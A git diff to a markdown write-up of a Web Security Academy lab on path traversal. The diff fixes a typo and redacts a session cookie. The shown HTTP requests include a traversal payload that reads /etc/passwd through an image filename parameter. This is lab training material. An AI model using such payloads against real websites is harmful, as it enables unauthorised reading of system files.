@@ -21,7 +21,7 @@ https://insecure-website.com/loadImage?filename=../../../etc/passwd
 
 ## Objectives
 
-The lab presents a shopping website with the objective of retrieving he contents of /etc/passwd. 
+The lab presents a shopping website with the objective of retrieving the contents of /etc/passwd. 
 
 ## Methods, Steps, & Results
 
@@ -30,7 +30,7 @@ I first began intercepting HTTP traffic with Burp's proxy. I grabbed the first G
 ```
 GET /image?filename=72.jpg HTTP/2
 Host: 0ad40060044768f580581c7d003a00db.web-security-academy.net
-Cookie: session=oOsj8PgIDSJghVVKDmRq9UU373RhBqSX
+Cookie: <redacted>
 Sec-Ch-Ua-Platform: "Linux"
 Accept-Language: en-US,en;q=0.9
 Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
@@ -50,7 +50,7 @@ Before forwarding the request to the server, I modified the filename:
 ```
 GET /image?filename=../../../etc/passwd HTTP/2
 Host: 0ad40060044768f580581c7d003a00db.web-security-academy.net
-Cookie: session=oOsj8PgIDSJghVVKDmRq9UU373RhBqSX
+Cookie: <redacted>
 Sec-Ch-Ua-Platform: "Linux"
 Accept-Language: en-US,en;q=0.9
 Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
